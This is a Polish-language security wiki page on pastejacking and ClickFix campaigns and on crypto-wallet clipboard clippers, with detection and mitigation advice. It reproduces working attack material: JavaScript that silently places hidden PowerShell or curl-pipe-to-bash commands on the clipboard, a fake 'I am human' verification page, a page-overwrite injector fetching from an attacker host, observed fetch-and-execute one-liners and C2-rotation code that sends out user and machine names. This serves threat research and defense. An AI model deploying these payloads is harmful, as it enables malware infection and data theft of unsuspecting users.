# Ataki Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> „Nigdy nie wklejaj niczego, czego samodzielnie nie skopiowałeś.” – stara, ale wciąż aktualna rada

## Omówienie

Clipboard hijacking – znany również jako *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia bez ich sprawdzania. Złośliwa strona internetowa (lub dowolny kontekst obsługujący JavaScript, taki jak aplikacja Electron lub Desktop) programowo umieszcza tekst kontrolowany przez atakującego w systemowym schowku. Ofiary są nakłaniane, zazwyczaj za pomocą starannie przygotowanych instrukcji socjotechnicznych, do naciśnięcia **Win + R** (okno Uruchamianie), **Win + X** (Quick Access / PowerShell) lub otwarcia terminala i *wklejenia* zawartości schowka, co natychmiast wykonuje dowolne polecenia.

Ponieważ **żaden plik nie jest pobierany i żaden załącznik nie jest otwierany**, technika omija większość zabezpieczeń poczty e-mail i treści internetowych, które monitorują załączniki, makra lub bezpośrednie wykonywanie poleceń. Z tego powodu atak jest popularny w kampaniach phishingowych dostarczających popularne rodziny malware, takie jak NetSupport RAT, loader Latrodectus lub Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippery zastępujące adresy portfeli

Inny wariant **clipboard hijacking** nie wkleja poleceń: czeka, aż ofiara skopiuje **adres portfela kryptowalutowego**, a następnie po cichu zamienia go na adres kontrolowany przez atakującego tuż przed wklejeniem. Jest to szczególnie skuteczne w przypadku długich formatów portfeli, ponieważ użytkownicy często sprawdzają tylko początkowe/końcowe znaki.<sup>[[8]](#references)</sup>

Typowe cechy spotykane w rzeczywistych atakach:
- **Cienki loader + zagnieżdżony payload**: widoczna aplikacja/plik exe wygląda jak legalne narzędzie tradingowe lub narzędzie do „zarabiania”, podczas gdy właściwy clipper jest ukryty głębiej w pakiecie (na przykład loader .NET uruchamia zagnieżdżony payload Rust).
- **Zastępowanie oparte na regexach**: malware dopasowuje ciągi takie jak `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` lub nawet ogólne ciągi przypominające adresy Solana o **długości 44 znaków**, a następnie zastępuje je portfelami atakującego.
- **Masowa rotacja portfeli**: współczesne próbki Windows mogą zawierać **tysiące** portfeli zastępczych dla każdej waluty zamiast jednego statycznego adresu, ograniczając utratę reputacji portfela po każdej kradzieży.<sup>[[8]](#references)</sup>

### Przebieg działania clippera w Windows

Częstą implementacją jest ukryte okno zarejestrowane za pomocą **`AddClipboardFormatListener`**. Przy każdej aktualizacji schowka malware zazwyczaj wywołuje:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → uzyskuje dostęp do bieżących danych schowka.
- **`GetClipboardData`** → odczytuje tekst.
- **`EmptyClipboard`** + **`SetClipboardData`** → zastępuje ciąg reprezentujący portfel wartością atakującego.

Minimalne regexy używane podczas huntingu, często spotykane w clipperach:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Persistencja na poziomie użytkownika wystarcza do osiągnięcia skutku. Zaobserwowany schemat to:<sup>[[8]](#references)</sup>
- Skopiowanie payloadu do **`%APPDATA%\silke\silke.exe`**
- Utworzenie pliku **LNK folderu Startup** w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Pomysły na wykrywanie:
- Procesy, które stale wywołują API schowka, jednocześnie zapisując dane w `%APPDATA%` i folderze użytkownika **Startup**.
- Utworzenie nowego pliku LNK/wykonywalnego, po którym następuje podmiana adresu portfela w schowku.
- Archiwa lub pakiety fałszywego oprogramowania zawierające wiele nieużywanych plików oraz mały launcher uruchamiający zagnieżdżony plik binarny.

### Usuwanie kwarantanny za pomocą socjotechniki + persystencja LaunchAgent w macOS

W macOS niektóre kampanie dostarczają pomocniczy plik **`unlocker.command`** i instruują ofiarę, aby kliknęła prawym przyciskiem myszy → **Otwórz**, jeśli Gatekeeper informuje, że aplikacja jest uszkodzona lub pochodzi od niezidentyfikowanego dewelopera. Skrypt po prostu usuwa kwarantannę i uruchamia znajdujący się obok plik `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
To **nie** jest exploit Gatekeeper; jest to **social-engineered quarantine bypass**, który wykorzystuje fakt, że decyzje Gatekeeper zależą od atrybutu xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Po wykonaniu clipper może utrzymać się jako bieżący użytkownik, zapisując:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – skrypt wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent z `RunAtLoad` i `KeepAlive`

Przydatnym szczegółem z perspektywy obrony jest to, że niektóre próbki implementują **self-healing watchdog**, który co około 30 sekund ponownie zapisuje LaunchAgent i wrapper. Jeśli najpierw usuniesz plist **bez zakończenia działającego procesu**, malware może natychmiast go odtworzyć.<sup>[[8]](#references)</sup> Bezpieczna kolejność czyszczenia:
1. Zakończ aktywny proces clippera.
2. Wyładuj/usuń plist LaunchAgent.
3. Usuń `~/launch.sh` oraz skopiowany payload.

### Nota dotycząca dostarczania: fałszywa reputacja jako force multiplier

W przypadku tej rodziny malware może pozostać technicznie proste, podczas gdy **warstwa dystrybucji** wykonuje większość pracy: fałszywe gwiazdki/forki na GitHub, recenzje/pobrania na SourceForge, komentarze/wyświetlenia pod tutorialami na YouTube oraz wyglądające niewinnie komentarze/głosy na VirusTotal służą do wzbudzenia zaufania do binarnego pliku przed jego wykonaniem.<sup>[[8]](#references)</sup>

## Wymuszane przyciski kopiowania i ukryte payloady (macOS one-liners)

Niektóre macOS infostealers klonują strony instalatorów (np. Homebrew) i **wymuszają użycie przycisku „Copy”**, aby użytkownicy nie mogli zaznaczyć tylko widocznego tekstu. Zawartość schowka obejmuje oczekiwaną komendę instalatora oraz dołączony payload Base64 (np. `...; echo <b64> | base64 -d | sh`), dzięki czemu pojedyncze wklejenie wykonuje oba elementy, podczas gdy interfejs ukrywa dodatkowy etap.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starsze kampanie używały `document.execCommand('copy')`, nowsze polegają na asynchronicznym **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Przebieg ClickFix / ClearFake

1. Użytkownik odwiedza stronę z typosquattingiem lub przejętą stronę (np. `docusign.sa[.]com`)
2. Wstrzyknięty kod JavaScript **ClearFake** wywołuje helper `unsecuredCopyToClipboard()`, który po cichu zapisuje w schowku zakodowany w Base64 one-liner PowerShell.
3. Instrukcje HTML informują ofiarę: *„Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
4. `powershell.exe` wykonuje polecenie, pobierając archiwum zawierające legalny plik wykonywalny oraz złośliwą bibliotekę DLL (klasyczne DLL sideloading).
5. Loader odszyfrowuje dodatkowe etapy, wstrzykuje shellcode i ustanawia persistence (np. scheduled task) – ostatecznie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Przykładowy łańcuch NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legalny Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwa DLL dynamicznie rozwiązuje API za pomocą **GetProcAddress**, pobiera dwa pliki binarne (`data_3.bin`, `data_4.bin`) za pośrednictwem **curl.exe**, odszyfrowuje je przy użyciu kroczącego klucza XOR `"https://google.com/"`, wstrzykuje końcowy shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Pobiera `la.txt` za pomocą **curl.exe**
2. Wykonuje JScript downloader wewnątrz **cscript.exe**
3. Pobiera MSI payload → umieszcza `libcef.dll` obok podpisanej aplikacji → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer przez MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Wywołanie **mshta** uruchamia ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, wypakowuje `Boat.pst` (CAB), rekonstruuje `AutoIt3.exe` za pomocą `extrac32` i konkatenacji plików, a następnie uruchamia skrypt `.a3x`, który eksfiltruje dane uwierzytelniające przeglądarki do `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Niektóre kampanie ClickFix całkowicie pomijają pobieranie plików i instruują ofiary, aby wkleiły one-liner pobierający i wykonujący JavaScript za pośrednictwem WSH, zapewniający persistence oraz codziennie rotujący C2. Przykładowy zaobserwowany łańcuch:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Kluczowe cechy
- Zaciemniony URL odwracany w czasie wykonywania w celu utrudnienia pobieżnej inspekcji.
- JavaScript utrwala się za pomocą Startup LNK (WScript/CScript) i wybiera C2 na podstawie bieżącego dnia, umożliwiając szybką rotację domen.<sup>[[3]](#references)</sup>

Minimalny fragment JS używany do rotacji C2 według daty:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Następny etap zwykle wdraża loader, który ustanawia persistence i pobiera RAT (np. PureHVNC), często przypinając TLS do hardcoded certyfikatu i dzieląc ruch na fragmenty.<sup>[[3]](#references)</sup>

Pomysły na detekcję specyficzne dla tego wariantu
- Drzewo procesów: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (lub `cscript.exe`).
- Artefakty autostartu: LNK w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, uruchamiający WScript/CScript ze ścieżką JS w `%TEMP%`/`%APPDATA%`.
- Telemetria rejestru/RunMRU i wiersza poleceń zawierająca `.split('').reverse().join('')` lub `eval(a.responseText)`.
- Wielokrotne `powershell -NoProfile -NonInteractive -Command -` z dużymi payloadami na stdin, aby przekazywać długie skrypty bez długich wierszy poleceń.
- Scheduled Tasks, które następnie uruchamiają LOLBins, takie jak `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, w ramach zadania/ścieżki wyglądających na związane z updaterem (np. `\GoogleSystem\GoogleUpdater`).

Polowanie na zagrożenia
- Codziennie rotowane hostnames i URL-e C2 ze wzorcem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Koreluj zdarzenia zapisu do schowka, po których następuje wklejenie za pomocą Win+R, a następnie natychmiastowe uruchomienie `powershell.exe`.

Blue teams mogą połączyć telemetrię schowka, tworzenia procesów i rejestru, aby dokładnie wykryć nadużycie pastejackingu:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię poleceń **Win + R** – szukaj nietypowych wpisów Base64 / obfuscated.
* Security Event ID **4688** (Process Creation), gdzie `ParentImage` == `explorer.exe`, a `NewProcessName` należy do { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** dotyczący tworzenia plików w `%LocalAppData%\Microsoft\Windows\WinX\` lub folderach tymczasowych bezpośrednio przed podejrzanym zdarzeniem 4688.
* Czujniki schowka EDR (jeśli są dostępne) – koreluj `Clipboard Write`, po którym natychmiast uruchomiony zostaje nowy proces PowerShell.

## Strony weryfikacyjne w stylu IUAM (ClickFix Generator): kopiowanie ze schowka do konsoli + payloady zależne od systemu operacyjnego

Nowsze kampanie masowo tworzą fałszywe strony weryfikacji CDN/przeglądarki („Just a moment…”, w stylu IUAM), nakłaniające użytkowników do kopiowania do schowka poleceń zależnych od systemu operacyjnego, a następnie wklejania ich do natywnych konsol. Przenosi to wykonanie poza sandbox przeglądarki i działa w systemach Windows oraz macOS.<sup>[[4]](#references)</sup>

Najważniejsze cechy stron generowanych przez builder
- Wykrywanie systemu operacyjnego za pomocą `navigator.userAgent` w celu dostosowania payloadu (Windows PowerShell/CMD vs. macOS Terminal). Opcjonalne decoys/no-ops dla nieobsługiwanych systemów operacyjnych, aby utrzymać iluzję.
- Automatyczne kopiowanie do schowka podczas nieszkodliwych działań interfejsu użytkownika (checkbox/Copy), podczas gdy widoczny tekst może różnić się od zawartości schowka.
- Blokowanie urządzeń mobilnych i popover z instrukcjami krok po kroku: Windows → Win+R→wklej→Enter; macOS → otwórz Terminal→wklej→Enter.
- Opcjonalne obfuscation i single-file injector nadpisujący DOM przejętej strony interfejsem weryfikacji stylizowanym za pomocą Tailwind (bez konieczności rejestrowania nowej domeny).<sup>[[4]](#references)</sup>

Przykład: niezgodność zawartości schowka + rozgałęzienie zależne od systemu operacyjnego
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence podczas pierwszego uruchomienia
- Użyj `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, aby wykonywanie było kontynuowane po zamknięciu terminala, zmniejszając liczbę widocznych artefaktów.<sup>[[4]](#references)</sup>

Przejęcie strony w miejscu na skompromitowanych witrynach
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Pomysły dotyczące wykrywania i threat huntingu specyficzne dla przynęt w stylu IUAM
- Web: Strony, które wiążą Clipboard API z widgetami weryfikacyjnymi; niezgodność między wyświetlanym tekstem a zawartością schowka; rozgałęzienia `navigator.userAgent`; Tailwind + single-page replace w podejrzanych kontekstach.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` krótko po interakcji z przeglądarką; instalatory batch/MSI uruchamiane z `%TEMP%`.
- macOS endpoint: Terminal/iTerm uruchamiające `bash`/`curl`/`base64 -d` z `nohup` w pobliżu zdarzeń przeglądarki; zadania działające w tle po zamknięciu terminala.
- Koreluj historię `RunMRU` Win+R i zapisy do schowka z późniejszym tworzeniem procesów konsolowych.

Zobacz także techniki pomocnicze

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Ewolucje fake CAPTCHA / ClickFix w 2026 roku (ClearFake, Scarlet Goldfinch)

- ClearFake nadal kompromituje witryny WordPress i wstrzykuje loader JavaScript, który łączy zewnętrzne hosty (Cloudflare Workers, GitHub/jsDelivr), a nawet wywołania blockchainowego „etherhiding” (np. żądania POST do endpointów Binance Smart Chain API, takich jak `bsc-testnet.drpc[.]org`) w celu pobrania aktualnej logiki przynęty. Nowsze nakładki intensywnie wykorzystują fake CAPTCHA, które instruują użytkowników, aby skopiowali/wkleili one-liner (T1204.004), zamiast cokolwiek pobierać.<sup>[[6]](#references)</sup>
- Początkowe wykonanie jest coraz częściej delegowane do podpisanych hostów skryptów/LOLBAS. W styczniu 2026 roku łańcuchy zastąpiły wcześniejsze użycie `mshta` wbudowanym `SyncAppvPublishingServer.vbs`, uruchamianym za pośrednictwem `WScript.exe` i otrzymującym argumenty podobne do PowerShell, zawierające aliasy/wildcards, w celu pobrania zdalnej zawartości:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` jest podpisany i zwykle używany przez App-V; w połączeniu z `WScript.exe` i nietypowymi argumentami (aliasy `gal`/`gcm`, cmdlety z wildcardami, adresy URL jsDelivr) staje się wyraźnym etapem LOLBAS dla ClearFake.<sup>[[6]](#references)</sup>
- W lutym 2026 r. fałszywe payloady CAPTCHA powróciły do czystych mechanizmów pobierania PowerShell. Dwa aktywne przykłady:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Pierwszy łańcuch to działający w pamięci grabber `iex(irm ...)`; drugi używa `WinHttp.WinHttpRequest.5.1`, zapisuje tymczasowy plik `.ps1`, a następnie uruchamia go z `-ep bypass` w ukrytym oknie.<sup>[[6]](#references)</sup>

Wskazówki dotyczące wykrywania i huntingu dla tych wariantów
- Drzewo procesów: przeglądarka → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` lub PowerShell cradles bezpośrednio po zapisie do schowka/Win+R.
- Słowa kluczowe w wierszu poleceń: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domeny jsDelivr/GitHub/Cloudflare Worker, lub wzorce surowego IP `iex(irm ...)`.
- Sieć: połączenia wychodzące do hostów CDN workerów lub endpointów blockchain RPC z hostów skryptów/PowerShell krótko po przeglądaniu stron internetowych.
- Pliki/rejestr: tworzenie tymczasowych plików `.ps1` w `%TEMP%` oraz wpisy RunMRU zawierające te one-linery; blokuj/zgłaszaj użycie podpisanych skryptów LOLBAS (WScript/cscript/mshta) wykonujących się z zewnętrznymi URL-ami lub zaciemnionymi aliasami.

## Tradecraft ClickFix z czerwca 2026: telemetria wklejania, fałszywe komentarze weryfikacyjne i łączenie LOLBinów

Najnowsza telemetria Red Canary pokazuje, że stabilnym wskaźnikiem **nie jest jedno konkretne polecenie**, lecz połączenie **wklejania i uruchamiania za pomocą użytkownika**, **zaufanych interpreterów/LOLBinów**, **zaciemnionych flag**, **zdalnego pobierania** oraz **natychmiastowego wykonania**.<sup>[[7]](#references)</sup>

### Zauważalne wzorce operatorów

- **Telemetria potwierdzenia wklejenia**: niektóre payloady wywołują `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` przed właściwym etapem. Potwierdza to interakcję użytkownika, jednocześnie utrzymując okno krótkie i dyskretne.
- **Fałszywe komentarze weryfikacyjne**: one-linery PowerShell mogą dodawać ciągi takie jak `# Security check ✔️ I'm not a robot Verification ID: 138105`, dzięki czemu polecenie nadal wygląda na powiązane z CAPTCHA po wklejeniu do Run / `cmd.exe` / historii PowerShell.
- **Dynamiczne odtwarzanie URL-a**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` pozwala uniknąć statycznego URL-a w wierszu poleceń, nadal wykonując pobieranie i uruchomienie w pamięci.
- **Podszywanie się pod wykonanie instalatora**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` wykorzystuje nietypową wielkość liter i znaki podobne do Unicode we flagach, aby omijać kruche mechanizmy wykrywania, nadal przypominając `msiexec.exe`.
- **Łańcuchy LOLBinów z użyciem znaków karetu**: `cmd.exe` może ukrywać słowa kluczowe za pomocą escapowania znakiem `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), uruchamiać zagnieżdżoną powłokę w trybie zminimalizowanym, zapisywać zawartość atakującego z nieszkodliwym rozszerzeniem, takim jak `.pdf`, a następnie wykonywać ją za pośrednictwem `mshta`.<sup>[[7]](#references)</sup>
## Środki zaradcze

1. Wzmocnienie przeglądarki – wyłącz możliwość zapisu do schowka (`dom.events.asyncClipboard.clipboardItem` itp.) lub wymagaj gestu użytkownika.
2. Świadomość bezpieczeństwa – ucz użytkowników, aby *wpisywali* wrażliwe polecenia lub najpierw wklejali je do edytora tekstu.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control w celu blokowania dowolnych one-linerów.
4. Kontrole sieciowe – blokuj połączenia wychodzące do znanych domen pastejackingu i malware C2.

## Powiązane techniki

* **Discord Invite Hijacking** często wykorzystuje to samo podejście ClickFix po zwabieniu użytkowników na złośliwy serwer:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Źródła

- [1] [Naprawianie kliknięcia: zapobieganie wektorowi ataku ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Fabryka ClickFix: pierwsze ujawnienie generatora IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025 – rok Infostealera](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
